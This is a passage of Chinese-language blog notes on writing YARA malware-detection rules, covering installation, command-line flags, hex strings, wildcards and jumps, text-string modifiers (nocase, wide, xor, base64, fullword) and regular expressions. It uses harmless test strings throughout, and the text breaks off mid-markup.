class="hljs-class"></span>&#123;<br><span class="hljs-symbol">    condition:</span><br>        string_ext_var matches /[a-z]+/<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="包含文件"><a href="#包含文件" class="headerlink" title="包含文件"></a>包含文件</h3><p>yara提供了<code>include</code>指令，它可以将其他规则文件包含到当前文件中。</p><blockquote><p>include “other.yar”</p></blockquote><p>相对路径</p><blockquote><p>include “./test/other.yar”</p><p>include “../test/other.yar”</p></blockquote><p>绝对路径</p><blockquote><p>include “C:/test/other.yar”</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://yara.readthedocs.io/en/v4.1.2/index.html">https://yara.readthedocs.io/en/v4.1.2/index.html</a></p><p><a href="https://www.cnblogs.com/SunsetR/p/12650325.html#autoid-3-2-0">https://www.cnblogs.com/SunsetR/p/12650325.html#autoid-3-2-0</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;上一篇地址 &lt;a href=&quot;https://b1ackie.cn/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/&quot;&gt;yara</summary>
      
    
    
    
    <category term="YARA" scheme="https://b1ackie.cn/categories/YARA/"/>
    
    
    <category term="YARA" scheme="https://b1ackie.cn/tags/YARA/"/>
    
    <category term="恶意代码检测" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>yara规则学习笔记（一）</title>
    <link href="https://b1ackie.cn/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://b1ackie.cn/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-09-13T07:06:57.000Z</published>
    <updated>2021-09-23T02:00:10.528Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>yara是一种皆在帮助恶意软件研究人员识别和分类恶意软件样本的工具。每一个描述，也就是规则，由一组字符串和一个确定其逻辑布尔表达式组成。</p><p>官方文档地址：</p><p><a href="https://yara.readthedocs.io/en/v4.1.2/index.html">https://yara.readthedocs.io/en/v4.1.2/index.html</a></p><p>windows端官方下载地址：</p><p><a href="https://github.com/VirusTotal/yara/releases/tag/v4.1.2">https://github.com/VirusTotal/yara/releases/tag/v4.1.2</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装非常的简单，在windows下，可以直接访问<a href="https://github.com/VirusTotal/yara/releases/tag/v4.1.2">https://github.com/VirusTotal/yara/releases/tag/v4.1.2</a>来进行下载</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/1.png"></p><p>下载解压之后就可以直接使用了，输入参数–help可以看到所有yara的参数。</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/2.png"></p><p>中文翻译</p><figure class="highlight haml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haml">-<span class="ruby">t --tag=tag只打印标记为tag的规则</span><br><span class="ruby"></span>-<span class="ruby">i --identifier=identifier只打印名为identifier的规则</span><br><span class="ruby"></span>-<span class="ruby">n --negate只打印不满足的规则（negate）</span><br><span class="ruby"></span>-<span class="ruby">D --打印模块数据打印模块数据</span><br><span class="ruby"></span>-<span class="ruby">g --打印标签打印标签</span><br><span class="ruby"></span>-<span class="ruby">m --打印元数据</span><br><span class="ruby"></span>-<span class="ruby">s --打印字符串打印匹配的字符串</span><br><span class="ruby"></span>-<span class="ruby">L --打印字符串长度打印匹配字符串的长度</span><br><span class="ruby"></span>-<span class="ruby">e --打印命名空间打印规则的命名空间</span><br><span class="ruby"></span>-<span class="ruby">p --threads=NUMBER使用指定的线程数扫描目录</span><br><span class="ruby"></span>-<span class="ruby">l --max rules=NUMBER匹配多个规则后中止扫描</span><br><span class="ruby"></span>-<span class="ruby">d VAR=值定义外部变量</span><br><span class="ruby"></span>-<span class="ruby">x MODULE=文件将文件内容作为额外数据传递到模块</span><br><span class="ruby"></span>-<span class="ruby">a --timeout=秒在给定秒数后中止扫描</span><br><span class="ruby"></span>-<span class="ruby">k --堆栈大小=插槽设置的最大堆栈大小（默认值=<span class="hljs-number">16384</span>）</span><br><span class="ruby"></span>-<span class="ruby">r --递归递归搜索目录</span><br><span class="ruby"></span>-<span class="ruby">f ——快速扫描快速匹配模式</span><br><span class="ruby"></span>-<span class="ruby">w --无警告禁用警告</span><br><span class="ruby"></span> -<span class="ruby">-警告失败警告失败</span><br><span class="ruby"></span>-<span class="ruby">v --版本显示版本信息</span><br><span class="ruby"></span>-<span class="ruby">h --help显示此帮助并退出</span><br></code></pre></div></td></tr></table></figure><h2 id="编写yara规则"><a href="#编写yara规则" class="headerlink" title="编写yara规则"></a>编写yara规则</h2><p>yara规则的语法类似于C语言，易于编写和理解，下面是官方给出的示例</p><figure class="highlight smalltalk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smalltalk">rule silent_banker : banker<br>&#123;<br>    meta:<br>        description = <span class="hljs-comment">&quot;This is just an example&quot;</span><br>        thread_level = <span class="hljs-number">3</span><br>        in_the_wild = <span class="hljs-keyword">true</span><br>    strings:<br>        <span class="hljs-string">$a</span> = &#123;<span class="hljs-number">6</span>A <span class="hljs-number">40</span> <span class="hljs-number">68</span> <span class="hljs-number">00</span> <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">6</span>A <span class="hljs-number">14</span> <span class="hljs-number">8</span>D <span class="hljs-number">91</span>&#125;<br>        <span class="hljs-string">$b</span> = &#123;<span class="hljs-number">8</span>D <span class="hljs-number">4</span>D <span class="hljs-type">B0</span> <span class="hljs-number">2</span>B <span class="hljs-type">C1</span> <span class="hljs-number">83</span> <span class="hljs-type">C0</span> <span class="hljs-number">27</span> <span class="hljs-number">99</span> <span class="hljs-number">6</span>A <span class="hljs-number">4</span>E <span class="hljs-number">59</span> <span class="hljs-type">F7</span> <span class="hljs-type">F9</span>&#125;<br>        <span class="hljs-string">$c</span> = <span class="hljs-comment">&quot;UVODFRYSIHLNWPEJXQZAKCBGMT&quot;</span><br>    condition:<br>        <span class="hljs-string">$a</span> or <span class="hljs-string">$b</span> or <span class="hljs-string">$c</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>meta是一些描述信息，</p><p>strings定义了一些十六进制值和一个字符串</p><p>condition定义了匹配的条件，a,b,c三个条件任意一个都会被认定为是silent_banker : banker</p><p>下面来进行一下简单的测试。</p><p>创建一个文件写入字符串，再创建一个文件写入$a的十六进制值。</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/3.png"></p><p>将它们放在test file文件夹下，进行检测，可以看到规则成功命中</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/4.png"></p><p>yara的每条规则都以关键字rule开头，后面跟规则标识符。标识符必须遵循与C编程语言相同的词汇约定，它们可以包含任何字母数字字符和下划线字符串，但是第一个字符不能是数字，规则标识符是区分大小写的，不可以超过128个字符。以下关键字是保留的，不能用作标识符：</p><table><thead><tr><th>all</th><th>and</th><th>any</th><th>ascii</th><th>at</th><th>base64</th><th>base64wide</th><th>condition</th></tr></thead><tbody><tr><td>contains</td><td>endswith</td><td>entrypoint</td><td>false</td><td>filesize</td><td>for</td><td>fullword</td><td>global</td></tr><tr><td>import</td><td>icontains</td><td>iendswith</td><td>in</td><td>include</td><td>int16</td><td>int16be</td><td>int32</td></tr><tr><td>int32be</td><td>int8</td><td>int8be</td><td>istartwith</td><td>matches</td><td>meta</td><td>nocase</td><td>not</td></tr><tr><td>of</td><td>or</td><td>private</td><td>rule</td><td>startswith</td><td>strings</td><td>them</td><td>true</td></tr><tr><td>uint16</td><td>uint16be</td><td>uint32</td><td>uint32be</td><td>uint8</td><td>uint8be</td><td>wide</td><td>xor</td></tr></tbody></table><p>规则部分通常是由两部分组成：字符串定义和条件。如果规则不依赖于任何字符串，则可以省略字符串定义部分，但始终需要条件部分。字符串定义部分是定义成为规则一部分的字符串的地方。每个字符串都有一个标识符，由$字符后跟一系列字母数字字符和下划线组成，这些标识符可以用于条件部分以引用相应的字符串。字符串可以以文本或者十六进制形式定义，如下所示：</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule <span class="hljs-keyword">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$test_string</span>=<span class="hljs-string">&quot;this is a test&quot;</span><br><span class="hljs-variable">$test_hex_value</span>=&#123;<span class="hljs-number">11</span> <span class="hljs-number">22</span> <span class="hljs-number">33</span> <span class="hljs-number">44</span>&#125;<br><span class="hljs-keyword">condition</span>:<br><span class="hljs-variable">$test_string</span> or <span class="hljs-variable">$test_hex_value</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>文本字符串用双引号括起来，像在C语言中一样，十六进制数字用大括号括起来。</p><p>条件部分是规则逻辑所在。该部分必须包含一个布尔表达式，说明在何种情况下文件或者进程满足规则。通常。条件将通过使用它们的标识符来引用先前定义的字符串。在这种情况下，字符串标识符充当布尔变量，如果在文件或者进程内存中找到字符串，则该变量评估为真，否则为假。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>可以向规则中添加注释，像C一样，支持单行和多行注释。</p><figure class="highlight mel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mel">rule test<br>&#123;<br><span class="hljs-comment">//这是单行注释</span><br>strings:<br>$test_string=<span class="hljs-string">&quot;this is a test&quot;</span><br>$test_hex_value=&#123;<span class="hljs-number">11</span> <span class="hljs-number">22</span> <span class="hljs-number">33</span> <span class="hljs-number">44</span>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">这是一个</span><br><span class="hljs-comment">多行注释</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">condition</span>:<br>$test_string or $test_hex_value<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>yara中有三种类型的字符串：十六进制字符串、文本字符串和正则表达式。十六进制字符串用于定义原始字节序列，而文本字符串和正则表达式用于定义清晰文本的部分。然而，文本字符串和正则表达式也可用于转义序列来表示原始字节。</p><h4 id="十六进制字符串"><a href="#十六进制字符串" class="headerlink" title="十六进制字符串"></a>十六进制字符串</h4><p>十六进制字符串允许三种特殊结构，使其更加灵活：通配符、跳转和替代。通配符只是一个占位符，表明某些字节是未知的，它们可以匹配任何内容。占位符是（?）。示例如下：</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule <span class="hljs-keyword">WildcardTest</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = &#123;<span class="hljs-number">31</span> <span class="hljs-number">32</span> <span class="hljs-number">33</span> <span class="hljs-number">34</span> ?? <span class="hljs-number">36</span> <span class="hljs-number">3</span>? <span class="hljs-number">38</span> <span class="hljs-number">39</span>&#125;<br><span class="hljs-keyword">condition</span>:<br><span class="hljs-variable">$a</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>现在向test文件内写入“123456789”这段字符串，可以成功检测。</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/5.png"></p><p>通配符在你知道字符串的可变块长度时很有用，然而，有时情况不是这样。某些情况下，可能需要定义具有可变内容和长度的块的字符串。在这些情况下可以使用跳转。</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule <span class="hljs-keyword">JumpTest</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = &#123;<span class="hljs-number">31</span> [<span class="hljs-number">0</span>-<span class="hljs-number">7</span>] <span class="hljs-number">39</span>&#125;<br><span class="hljs-keyword">condition</span>:<br><span class="hljs-variable">$a</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>还是继续测试刚才的文件，可以看到成功检测到，提示了一个warning意思是可能会拖慢扫描速度，主要是规则编写的不到位，不够精准。</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/6.png"></p><p>在上面的例子中，用方括号括起来0-7，这就是一个跳转，意思是任何0-7个字节的任意序列都可以占据此位置，比如这些字符都是可以匹配到当前规则的。</p><blockquote><p>123456789</p><p>1xx9</p><p>19</p><p>1asdasd9</p></blockquote><p>任何跳转的条件[X-Y]都必须满足Y&gt;X的条件，如下是无效的</p><blockquote><p>31 32 [10-2] 39</p></blockquote><p>如果上下限相等，也就是说要匹配的数字的长度是固定的，可以写一个括在括号里的数字，如下所示</p><blockquote><p>31 32 33 [2] 36</p></blockquote><p>其等价于：</p><blockquote><p>31 32 33 [2-2] 36</p><p>31 32 33 ?? ?? 36</p></blockquote><p>从yara2.0开始还有无界跳转</p><blockquote><p>31 32 [10-] 39</p><p>31 32 [-] 39</p></blockquote><p>第一个的意思是10-无限，第二个意思是无限。</p><p>在某些情况下，可以使用正则表达式的语法</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule <span class="hljs-keyword">Test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = &#123;<span class="hljs-number">31</span> <span class="hljs-number">32</span> (<span class="hljs-number">33</span> <span class="hljs-number">34</span> | <span class="hljs-number">36</span> <span class="hljs-number">37</span>) <span class="hljs-number">39</span>&#125;<br><span class="hljs-keyword">condition</span>:<br><span class="hljs-variable">$a</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>此规则将会匹配<code>12349</code>和<code>12679</code></p><p>也可以将通配符结合起来，如下：</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">rule <span class="hljs-keyword">Test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = &#123;<span class="hljs-number">31</span> <span class="hljs-number">32</span> (<span class="hljs-number">33</span> <span class="hljs-number">34</span> | <span class="hljs-number">36</span> <span class="hljs-number">37</span> | <span class="hljs-number">41</span> ?? <span class="hljs-number">4</span>?) <span class="hljs-number">39</span>&#125;<br><span class="hljs-keyword">condition</span>:<br><span class="hljs-variable">$a</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>此时如果有一个字符串<code>12A0G9</code>的字符串也可以被检测到（这只是其中之一，可以根据条件自行构建字符串，并不是唯一的）。</p><h4 id="文本字符串"><a href="#文本字符串" class="headerlink" title="文本字符串"></a>文本字符串</h4><p>文本字符串都是这样定义的</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">Test</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">strings:</span><br>$a = <span class="hljs-string">&quot;this is a test&quot;</span><br><span class="hljs-symbol">condition:</span><br>$a<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>这是最简单的情况：ASCII编码、区分大小写。文本字符串还可以包含以下C语言中可用的转义字符：</p><table><thead><tr><th>\“</th><th>双引号</th></tr></thead><tbody><tr><td>\\</td><td>反斜杠</td></tr><tr><td>\r</td><td>回车</td></tr><tr><td>\t</td><td>水平标签</td></tr><tr><td>\n</td><td>回车换行</td></tr><tr><td>\xdd</td><td>十六进制表示</td></tr></tbody></table><p>文本字符串还可以附带一些有用的修饰符，这些修饰符可以改变字符串的解释方式。这些修饰符附加在由空格分隔的字符串定义的末尾。</p><h5 id="不区分大小写"><a href="#不区分大小写" class="headerlink" title="不区分大小写"></a>不区分大小写</h5><p>yara中默认文本字符串是区分大小写的，但是可以通过在字符串定义的末尾附加修饰符nocase将字符串转换为不区分大小写的模式。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">Test</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">strings:</span><br>$a = <span class="hljs-string">&quot;this is a test&quot;</span> nocase<br><span class="hljs-symbol">condition:</span><br>$a<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>在测试文件中，改成大写的字符串</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/7.png"></p><p>成功检出</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/8.png"></p><h5 id="宽字符串"><a href="#宽字符串" class="headerlink" title="宽字符串"></a>宽字符串</h5><p><code>wide</code>可以用于搜索宽字符串</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">TestWide</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">strings:</span><br>$a = <span class="hljs-string">&quot;this is a test&quot;</span> wide<br><span class="hljs-symbol">condition:</span><br>$a<br>&#125;<br></code></pre></div></td></tr></table></figure><p>写一个小DEMO，定义一个宽字符串</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">wchar_t</span> a[] = <span class="hljs-string">L&quot;this is a test&quot;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%ws\n&quot;</span>, a);<br></code></pre></div></td></tr></table></figure><p>成功检出</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/9.png"></p><p>如果想同时搜索ASCII和宽字节字符串，可以将<code>ascii</code>和<code>wide</code>结合起来</p><figure class="highlight cos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cos">rule TestWideAndAscii<br>&#123;<br>strings:<br><span class="hljs-built_in">$a</span> = <span class="hljs-string">&quot;this is a test&quot;</span> wide <span class="hljs-keyword">ascii</span><br>condition:<br><span class="hljs-built_in">$a</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>在test.txt中写入this is a test，可以检测出宽字符的exe和ascii的txt</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/10.png"></p><h5 id="异或字符串"><a href="#异或字符串" class="headerlink" title="异或字符串"></a>异或字符串</h5><p><code>xor</code>可以用于搜索字符串的单字节xor结果，比如以下规则可以搜索“this is a test”的每个字符的异或。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">TestXor</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">strings:</span><br>$a = <span class="hljs-string">&quot;this is a test&quot;</span> xor<br><span class="hljs-symbol">condition:</span><br>$a<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在test.txt中写入“dxyc0yc0q0ducd”，这是“this is a test”每个字符与0x10异或后的结果。</p><p>成功检出</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/11.png"></p><p>上面这个逻辑是等价于</p><figure class="highlight mel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mel">rule test<br>&#123;<br>strings:<br>$a = <span class="hljs-string">&quot;dxyc0yc0q0ducd&quot;</span><span class="hljs-comment">// this is a test 异或0x10结果</span><br>$b = <span class="hljs-string">&quot;fz&#123;a2&#123;a2s2fwaf&quot;</span><span class="hljs-comment">// this is a test 异或0x12结果</span><br>$c = &#123;<span class="hljs-number">8</span>b <span class="hljs-number">97</span> <span class="hljs-number">96</span> <span class="hljs-number">8</span>c df <span class="hljs-number">96</span> <span class="hljs-number">8</span>c df <span class="hljs-number">9</span>e df <span class="hljs-number">8</span>b <span class="hljs-number">9</span>a <span class="hljs-number">8</span>c <span class="hljs-number">8</span>b&#125;<br><span class="hljs-comment">//this is a test 异或0xFF结果</span><br><span class="hljs-keyword">condition</span>:<br>any of them<br>&#125;<br></code></pre></div></td></tr></table></figure><p>也可以将<code>wide</code>和<code>ascii</code>结合使用</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">rule testXorAsciiWide<br>&#123;<br><span class="hljs-built_in">string</span><span class="hljs-variable">s:</span><br>$<span class="hljs-keyword">a</span> = <span class="hljs-string">&quot;this is a test&quot;</span> <span class="hljs-built_in">xor</span> wide <span class="hljs-keyword">ascii</span><br><br>condition:<br>$<span class="hljs-keyword">a</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>从yara3.11开始，可以控制异或的范围，如下所示。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">TestXor</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">strings:</span><br>$a = <span class="hljs-string">&quot;this is a test&quot;</span> xor(<span class="hljs-number">0x01</span><span class="hljs-number">-0x10</span>)<br><span class="hljs-symbol">condition:</span><br>$a<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="Base64字符串"><a href="#Base64字符串" class="headerlink" title="Base64字符串"></a>Base64字符串</h5><p><code>base64</code>可以用于搜索被base64编码过后的字符串，以下规则将搜索“this is a test”base64编码后的结果。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">testBase64</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">strings:</span><br>$a = <span class="hljs-string">&quot;this is a test&quot;</span> base64<br><span class="hljs-symbol">condition:</span><br>$a<br>&#125;<br></code></pre></div></td></tr></table></figure><p>this is a testbase64编码后结果是：dGhpcyBpcyBhIHRlc3Q=</p><p><img src="/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/12.png"></p><p><code>base64wide</code>是搜索宽字符</p><h5 id="搜索完整词"><a href="#搜索完整词" class="headerlink" title="搜索完整词"></a>搜索完整词</h5><p><code>fullword</code>该修饰符保证字符串仅出现在由非字母数字字符分隔的文件中时才匹配。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">testFullword</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">strings:</span><br>$a = <span class="hljs-string">&quot;b1ackie&quot;</span> fullword<br><span class="hljs-symbol">condition:</span><br>$a<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这种时候，比如iamb1ackie和 <a href="http://www.b1ackieblog.com/">www.b1ackieblog.com</a> 都是不匹配的，但是可匹配 <a href="http://www.b1ackie.cn/">www.b1ackie.cn</a> 和 <a href="http://www.b1ackie-blog.com/">www.b1ackie-blog.com</a></p><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>正则表达式是yara最强大的功能之一，它们的定义方式与文本字符串相同，使用正斜杠而不是双引号括起来。</p><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">rule test<br>&#123;<br><span class="hljs-attr">strings</span>:<br><span class="hljs-symbol">$a</span> = <span class="hljs-regexp">/md5: [0-9a-fA-F]&#123;32&#125;/</span><br>condition:<br><span class="hljs-symbol">$a</span> <br>&#125;<br></code></pre></div></td></tr></table></figure><p><img 